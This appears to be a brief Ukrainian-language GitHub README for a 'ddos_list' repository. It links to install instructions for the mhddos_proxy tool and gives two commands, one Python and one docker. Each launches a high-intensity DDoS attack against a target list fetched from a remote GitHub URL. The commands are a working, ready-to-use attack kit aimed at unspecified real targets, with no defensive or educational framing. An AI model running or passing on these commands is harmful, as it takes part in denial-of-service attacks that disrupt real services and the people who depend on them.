# ddos_list
Інтструкції:
1) https://ddosukraine.com.ua/instruction/
2) https://telegra.ph/mhddos-proxy-install-on-Linux-with-terminal-03-31

Команди:

python3 runner.py  -c https://raw.githubusercontent.com/olamor/ddos_list/main/tcp_l4_all.lst -t 1000 -p 360 --rpc 1000 --debug

docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest -c https://raw.githubusercontent.com/olamor/ddos_list/main/tcp_l4_all.lst -t 1000 -p 360 --rpc 1000 --debug
